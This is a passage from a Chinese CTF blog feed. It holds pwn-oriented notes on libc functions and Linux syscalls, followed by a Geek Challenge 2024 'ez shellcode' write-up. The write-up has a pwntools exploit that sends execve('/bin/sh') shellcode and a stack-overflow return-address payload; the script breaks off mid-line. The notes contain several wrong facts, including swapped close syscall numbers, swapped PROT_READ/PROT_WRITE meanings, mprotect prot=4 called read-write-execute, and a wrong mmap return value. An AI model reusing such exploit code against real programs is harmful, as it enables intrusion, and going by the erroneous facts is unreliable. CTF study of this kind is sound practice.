class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int dirfd</span><br><span class="line">• 含义：目录文件描述符，指定 pathname 的解析起点。</span><br><span class="line">• 常见值：</span><br><span class="line">  AT_FDCWD：当前工作目录（与 open 函数类似）。</span><br><span class="line">• 有效文件描述符：指向一个目录的文件描述符。</span><br><span class="line">• 用途：用于指定 pathname 的上下文目录。</span><br><span class="line"></span><br><span class="line">const char *pathname</span><br><span class="line">• 含义：文件路径名。</span><br><span class="line">• 行为：</span><br><span class="line">  如果 dirfd 是 AT_FDCWD，则 pathname 是相对于当前工作目录的路径。</span><br><span class="line">  如果 dirfd 是一个有效的目录文件描述符，则 pathname 是相对于该目录的路径。</span><br><span class="line">  如果 pathname 是绝对路径（以 / 开头），则 dirfd 被忽略。</span><br><span class="line"></span><br><span class="line">int flags</span><br><span class="line">• 含义：文件打开模式标志，与 open 函数的 flags 参数相同。</span><br><span class="line">• 常用标志：</span><br><span class="line">  O_RDONLY：只读模式。</span><br><span class="line">  O_WRONLY：只写模式。</span><br><span class="line">  O_RDWR：读写模式。</span><br><span class="line">  O_CREAT：如果文件不存在，则创建新文件。</span><br><span class="line">  O_TRUNC：如果文件已存在，则清空文件。</span><br><span class="line">  O_APPEND：写操作时追加到文件末尾。</span><br><span class="line">  O_EXCL：与 O_CREAT 一起使用，确保文件不存在。</span><br></pre></td></tr></table></figure><p><strong><code>dirfd</code> 参数的宏定义</strong></p><table><thead><tr><th>宏定义</th><th>数值</th><th>含义</th></tr></thead><tbody><tr><td><code>AT_FDCWD</code></td><td>-100</td><td>当前工作目录。</td></tr></tbody></table><p><strong><code>flags</code> 参数的宏定义</strong></p><table><thead><tr><th>宏定义</th><th>数值</th><th>含义</th></tr></thead><tbody><tr><td><code>O_RDONLY</code></td><td>0</td><td>以只读方式打开文件。</td></tr><tr><td><code>O_WRONLY</code></td><td>1</td><td>以只写方式打开文件。</td></tr><tr><td><code>O_RDWR</code></td><td>2</td><td>以读写方式打开文件。</td></tr><tr><td><code>O_CREAT</code></td><td>64</td><td>如果文件不存在，则创建新文件。</td></tr><tr><td><code>O_TRUNC</code></td><td>512</td><td>如果文件已存在，则将其长度截断为 0。</td></tr><tr><td><code>O_APPEND</code></td><td>1024</td><td>写操作时，数据会被追加到文件末尾。</td></tr><tr><td><code>O_EXCL</code></td><td>2048</td><td>与  一起使用，确保如果文件已存在，则调用失败。</td></tr><tr><td><code>O_DIRECTORY</code></td><td>65536</td><td>要求  是一个目录，否则调用失败。</td></tr></tbody></table><p><strong><code>mode</code> 参数的权限位</strong></p><table><thead><tr><th>宏定义</th><th>数值</th><th>含义</th></tr></thead><tbody><tr><td><code>S_IRUSR</code></td><td>04000400</td><td>文件所有者具有读权限。文件所有者具有读权限。</td></tr><tr><td><code>S_IWUSR</code></td><td>0200</td><td>文件所有者具有写权限。</td></tr><tr><td><code>S_IXUSR</code></td><td>0100</td><td>文件所有者具有执行权限。</td></tr><tr><td><code>S_IRGRP</code></td><td>0040</td><td>所属组具有读权限。</td></tr><tr><td><code>S_IWGRP</code></td><td>0020</td><td>所属组具有写权限。</td></tr><tr><td><code>S_IXGRP</code></td><td>0010</td><td>所属组具有执行权限。</td></tr><tr><td><code>S_IROTH</code></td><td>0004</td><td>其他用户具有读权限。</td></tr><tr><td><code>S_IWOTH</code></td><td>0002</td><td>其他用户具有写权限。</td></tr><tr><td><code>S_IXOTH</code></td><td>0001</td><td>其他用户具有执行权限。</td></tr></tbody></table><p><strong>返回值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：返回一个非负整数，表示打开的文件描述符。</span><br><span class="line">失败：返回 -1，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br></pre></td></tr></table></figure><p><code>close</code>函数用于关闭一个打开的文件描述符。它释放与文件描述符关联的系统资源。</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td><code>fd</code></td><td>要关闭的文件描述符。</td></tr></tbody></table><p><strong>系统调用：</strong></p><p>64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eax  --&gt;  6</span><br><span class="line">ebx  --&gt;  fd</span><br></pre></td></tr></table></figure><p>32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rax  --&gt;  3</span><br><span class="line">rdi  --&gt;  fd</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：返回 0。</span><br><span class="line">失败：返回 -1，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure><p><strong>参数：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fd（文件描述符）：</span><br><span class="line">• 一个非负整数，表示要从中读取数据的文件或设备。</span><br><span class="line">• 文件描述符通常通过系统调用（如open、pipe 、socket等）获得。</span><br><span class="line">• 标准输入（stdin）的文件描述符是 0 </span><br><span class="line"></span><br><span class="line">buf（缓冲区）：</span><br><span class="line">• 一个指向存储读取数据的内存区域的指针。</span><br><span class="line">• 读取的数据将被存储在这个缓冲区中。</span><br><span class="line"></span><br><span class="line">count（读取字节数）：</span><br><span class="line">• 指定最多要读取的字节数。</span><br><span class="line">• 实际读取的字节数可能少于count，具体取决于文件的内容和当前的读取位置。</span><br></pre></td></tr></table></figure><p><strong>64位</strong></p><p>寄存器传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi  --&gt;  fd</span><br><span class="line">rsi  --&gt;  *buf</span><br><span class="line">rdx  --&gt;  count</span><br></pre></td></tr></table></figure><p>系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax  --&gt;  0</span><br><span class="line">rdi  --&gt;  fd</span><br><span class="line">rsi  --&gt;  *buf</span><br><span class="line">rdx  --&gt;  count</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><strong>32位</strong></p><p>栈传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7FFFFFFF: 返回地址</span><br><span class="line">0x7FFFFFFC: 3       (fd)</span><br><span class="line">0x7FFFFFF8: 0x12345678 (buf)</span><br><span class="line">0x7FFFFFF4: 10      (count)</span><br></pre></td></tr></table></figure><p>系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax  --&gt;  3</span><br><span class="line">ebx  --&gt;  fd</span><br><span class="line">ecx  --&gt;  *buf</span><br><span class="line">edx  --&gt;  count</span><br><span class="line">int 80</span><br></pre></td></tr></table></figure><p><code>payload = b&#39;a&#39;*(0x30+4)+p32(read)+p32(fd)+p32(buf)+p32(count)</code></p><p><strong>返回值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">成功：</span><br><span class="line">返回实际读取字节数</span><br><span class="line">如果返回值大于 0，表示成功读取了指定数量的字节（或部分字节，如果文件末尾或设备限制）。</span><br><span class="line">如果返回值为 0，表示已到达文件末尾（EOF）。</span><br><span class="line">失败：</span><br><span class="line">返回值：返回 -1，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><p><strong>小tips：当沙箱规定read的文件描述符必须为零时，我们想要打orw得先关闭标准输入流也就是调用<code>close(0)</code>关闭后即使read的fd参数是0也会被重定向到opean打开的文件中。</strong></p><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td><code>fd</code></td><td>要写入的文件描述符。</td></tr><tr><td><code>buf</code></td><td>指向要写入的数据的缓冲区。</td></tr><tr><td><code>count</code></td><td>要写入的字节数。</td></tr></tbody></table><table><thead><tr><th>流</th><th>文件描述符</th></tr></thead><tbody><tr><td><code>stdio</code>标准输入流</td><td>0</td></tr><tr><td><code>stdout</code>标准输出流</td><td>1</td></tr><tr><td><code>stderr</code>标准错误流</td><td>2</td></tr></tbody></table><p><strong>系统调用：</strong></p><p>64位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax  --&gt;  1</span><br><span class="line">rdi  --&gt;  fd</span><br><span class="line">rsi  --&gt;  buf</span><br><span class="line">rdx  --&gt;  count</span><br></pre></td></tr></table></figure><p>32位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax  --&gt;  4</span><br><span class="line">ebx  --&gt;  fd</span><br><span class="line">ecx  --&gt;  buf</span><br><span class="line">edx  --&gt;  count</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：返回实际写入的字节数。</span><br><span class="line">失败：返回 -1，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="fgets"><a href="#fgets" class="headerlink" title="fgets"></a>fgets</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> n, FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>截断条件：输入字符达到n-1个包括换行符，或输入字符小于n-1检测到换行符停止获取输入并将换行符也读入。</p><p><strong>参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str：指向存储读取内容的字符数组的指针。</span><br><span class="line">n：指定最多读取的字符数（包括字符串末尾的空字符 \0）。</span><br><span class="line">stream：指向输入流的指针（如 stdin 表示标准输入，FILE *file 表示文件流）。</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：返回指向 str 的指针。</span><br><span class="line">失败或文件结束：返回 NULL。</span><br></pre></td></tr></table></figure><h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dest: 目标内存地址，数据将被复制到这里</span><br><span class="line">src：源内存地址，数据将从这里被复制</span><br><span class="line">n：要复制的字节数</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><p>返回目标内存地址dest</p><h3 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* start,<span class="type">size_t</span> len,<span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p><code>mprotect</code>函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</p><p><strong>参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start：是指向需要进行操作的地址</span><br><span class="line">len：是地址往后多大的长度</span><br><span class="line">port：是要赋予的权限</span><br></pre></td></tr></table></figure><p>区间开始的地址start必须是一个内存页的起始地址(地址的后三位为0，0x1000&#x3D;4096u)，指定的内存区间必须包含整个内存页(4KB&#x3D;4096B)</p><p>区间长度len必须是页大小的整数倍。</p><p><strong>prot</strong>可以取一下几个值，并且可以用”|”将几个属性合起来使用：</p><ul><li>PROT_READ：表示内存段内的内容可写；</li><li>PROT_WRITE：表示内存段内的内容可读；</li><li>PROT_EXEC：表示内存段中的内容可执行；</li><li>PROT_NONE：表示内存段中的内容根本没法访问；</li><li><strong>prot&#x3D;7 是可读、可写、可执行</strong>7&#x3D;1+2+4(r:4 w:2 x:1)</li></ul><p>返回值：0；成功，-1；失败</p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure><p><code>buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);</code></p><p>是一个典型的   mmap   调用，用于创建一个可以读、写和执行的内存映射区域，并将返回的地址赋值给变量   buf  </p><p>参数解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1.addr  ：</span><br><span class="line">• 类型：  void *  </span><br><span class="line">• 值：  0LL  （即0）</span><br><span class="line">• 含义：建议的映射地址。如果设置为 NULL 或 0 ，操作系统会选择一个合适的地址进行映射。这通常是推荐的做法，除非你需要特定的地址。</span><br><span class="line">2.length  ：</span><br><span class="line">• 类型：  size_t  </span><br><span class="line">• 值：  0x1000uLL  （即4096）</span><br><span class="line">• 含义：映射区域的大小，以字节为单位。这里映射了 4096 字节，通常是一个内存页面大小。</span><br><span class="line">3.   prot  ：</span><br><span class="line">• 类型：  int  </span><br><span class="line">• 值：  7  </span><br><span class="line">• 含义：指定映射区域的保护属性。7 是   PROT_READ | PROT_WRITE | PROT_EXEC   的组合，表示映射区域可以读、写和执行。</span><br><span class="line">4.   flags  ：</span><br><span class="line">• 类型：  int  </span><br><span class="line">• 值：  34  </span><br><span class="line">• 含义：指定映射的类型和行为。  34   是   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED   的组合：</span><br><span class="line">   MAP_PRIVATE  ：映射是私有的，对映射区域的修改不会反映到文件中。</span><br><span class="line">   MAP_ANONYMOUS  ：映射区域不与任何文件关联，通常用于分配匿名内存。</span><br><span class="line">   MAP_FIXED  ：强制使用指定的地址 addr 进行映射。如果 addr 不为 0 ，操作系统会尝试在该地址创建映射。如果该地址已经被占用或不可用，mmap 会失败。</span><br><span class="line">5.   fd  ：</span><br><span class="line">• 类型：  int  </span><br><span class="line">• 值：  -1  </span><br><span class="line">• 含义：文件描述符。对于   MAP_ANONYMOUS   映射，fd 必须设置为   -1  ，表示不与任何文件关联。</span><br><span class="line">6.   offset  ：</span><br><span class="line">• 类型：  off_t  </span><br><span class="line">• 值：  0LL  （即   0  ）</span><br><span class="line">• 含义：文件偏移量。对于匿名映射，这个参数通常设置为   0  。</span><br></pre></td></tr></table></figure><p>返回值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• 如果成功，mmap 返回 0 。</span><br><span class="line">• 如果失败，mmap 返回 -1 ，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length)</span>;</span><br></pre></td></tr></table></figure><p>用于撤销mmap分配的内存映射区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.   addr  ：</span><br><span class="line">• 指向要撤销映射的内存区域的起始地址。</span><br><span class="line">• 这个地址必须是之前通过   mmap   调用返回的地址。</span><br><span class="line">2.   length  ：</span><br><span class="line">• 要撤销映射的内存区域的大小（以字节为单位）。</span><br><span class="line">• 这个大小必须是页面大小的整数倍（通常为 4KB 或 2MB，具体取决于系统配置）。</span><br></pre></td></tr></table></figure><p>返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• 如果成功，munmap 返回 0 。</span><br><span class="line">• 如果失败，munmap 返回 -1 ，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">atoi</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br></pre></td></tr></table></figure><p>str指向一个以空字符<code>\0</code>结尾的串</p><p> atoi   的作用是将字符串   str   转换为一个整数。它会从字符串的开头开始解析，直到遇到第一个非数字字符（包括正负号和数字）为止。如果字符串以非数字字符开头，则返回值为   0  。</p><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2)</span>;</span><br></pre></td></tr></table></figure><p>用于比较两字符串并根据比较结果返回一个整数</p><p>返回值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">相等 --&gt;  0</span><br><span class="line">str1&gt;str2  --&gt;返回正值   当str1中第一个与str2不同的字符的 ASCII 值大于str2中相应字符的 ASCII 值时</span><br><span class="line">str1&lt;str2  --&gt;返回负值   str1中第一个与str2不同的字符的 ASCII 值小于str2中相应字符的 ASCII 值。</span><br></pre></td></tr></table></figure><p>找到不同的字符：如果两个字符串中相同位置上的字符不同，函数将返回这两个字符 ASCII 值的差值。</p><p> 到达字符串结尾：如果两个字符串在某个位置之前完全相同，并且其中一个字符串在该位置结束（即遇到空字符   \0  ），那么   strcmp   将返回 0（如果两个字符串长度相同），或者返回剩余字符的 ASCII 值（如果一个字符串比另一个长）。</p><h3 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br></pre></td></tr></table></figure><p>用于将src指向字符串复制到dest中，直到遇到src中的<code>\0</code>时截至，存在溢出风险</p><h3 id="dlopen"><a href="#dlopen" class="headerlink" title="dlopen"></a>dlopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">dlopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p> dlopen   函数用于在运行时打开一个共享库，并返回一个指向该库的句柄。这个句柄可以用于后续的   dlsym   调用，以查找库中的符号（如函数和变量）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">参数:</span><br><span class="line">filename：要打开的共享库的名称。可以是绝对路径或相对于当前工作目录的路径。</span><br><span class="line">flag  ：控制加载方式的标志。常用的标志包括：</span><br><span class="line">    RTLD_LAZY  ：延迟绑定，只有在首次使用符号时才解析。</span><br><span class="line">    RTLD_NOW  ：立即绑定，加载时解析所有符号，如果失败则返回 NULL。</span><br><span class="line">    RTLD_GLOBAL  ：在其他   dlopen   调用中加载的符号对后续调用可见。</span><br><span class="line">当   flag   参数设置为   258  （即   0x102  ），相当于   RTLD_LAZY | RTLD_GLOBAL  ，它指示   dlopen   以延迟绑定的方式加载共享库，同时使得该库中的符号对其他可能加载的共享库全局可见。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回值:</span><br><span class="line">成功时返回一个非 NULL 的库句柄。</span><br><span class="line">失败时返回 NULL，并设置   errno   以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="dlsym"><a href="#dlsym" class="headerlink" title="dlsym"></a>dlsym</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">dlsym</span><span class="params">(<span class="type">void</span> *handle, <span class="type">const</span> <span class="type">char</span> *symbol)</span>;</span><br></pre></td></tr></table></figure><p>dlsym 函数  dlsym   函数用于从一个已经打开的共享库中检索符号（如函数或变量）的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数</span><br><span class="line">handle：由 dlopen 返回的库句柄。</span><br><span class="line">symbol：要检索的符号的名称。</span><br><span class="line">返回值</span><br><span class="line">成功时返回符号的地址。</span><br><span class="line">失败时返回 NULL，并设置 errno 以指示错误原因。</span><br></pre></td></tr></table></figure><h3 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fflush</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>功能：  fflush   用于将文件流   stream   的缓冲区中的数据强制写入文件或输出设备。如果   stream   是输出流（如文件或标准输出），  fflush   会将缓冲区中的数据写入目标；如果是输入流，  fflush   的行为是未定义的。</p><p>参数：</p><p>stream  ：指向   FILE   结构的指针，表示要刷新的文件流。</p><p>返回值：成功时返回   0  。失败时返回   EOF  （通常定义为   -1  ）。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2024复现</title>
      <link href="/2025/04/10/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/04/10/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez shellcode"></a>ez shellcode</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>checksec</p><p><img src="/../images/jk2024/ezshellcode1.png" alt="1"></p><p>发现开了nx,没开canary</p><p>分析main函数</p><p><img src="/../images/jk2024/ezshellcode2.png" alt="1"></p><p>发现第一次read获取输入填入bss段的shellcode中，但bss段可读可写不可执行，找找有没有提权函数，没开canary可以利用gets部分截取执行流。</p><p>发现提权函数gift（真的是一个好gift）</p><p><img src="/../images/jk2024/ezshellcode3.png" alt="1"></p><p>mprotect()函数将bss段的shellcode部分设置为可执行</p><p><strong>mprotect()函数注释</strong></p><blockquote><p>mprotect(shellcode, 0x500uLL, 4) 是一个调用 mprotect() 函数的语句，其作用是改变从地址 shellcode 开始、长度为 0x500 字节（即1280字节）的内存区域的保护属性。这里的参数解释如下：</p><ul><li><p>shellcode：这是指向需要修改权限的内存区域起始地址的指针。</p></li><li><p>0x500uLL：表示要修改权限的内存区域的长度，单位是字节。这里使用无符号长整型（unsigned long long），确保可以处理较大的值。</p></li><li><p>4</p><p>：新的保护标志，通常代表可读、可写和可执行权限。在Linux中，这个值通常是通过宏定义组合而成的：</p><ul><li>PROT_READ (1) | PROT_WRITE (2) | PROT_EXEC (4)</li></ul></li></ul><p>mprotect() 函数是一个在Unix和类Unix操作系统中使用的系统调用，其主要作用是改变一个内存区域的访问权限。具体来说：</p><ol><li>修改保护属性：mprotect() 允许程序动态地更改指定内存页的访问权限（如可读、可写、可执行等）。</li><li>参数说明：<ul><li>addr：要修改权限的起始地址。</li><li>len：需要修改权限的内存区域的长度。</li><li>prot：新的保护标志，可以是以下几种值的组合：<ul><li>PROT_NONE：不可访问</li><li>PROT_READ：可读</li><li>PROT_WRITE：可写</li><li>PROT_EXEC：可执行</li></ul></li></ul></li></ol></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先通过read函数写入64位的shellcode(注意：使用pwntools直接生成的shellcode默认是32位的)，本次用的是现成的shellcode</p><p>接着通过gets函数进行栈溢出控制执行流到gift函数提权位于bss段存放的shellcode使其可执行</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>) </span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_address=<span class="number">0x401256</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">8</span>)+p64(shellcode_address)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span 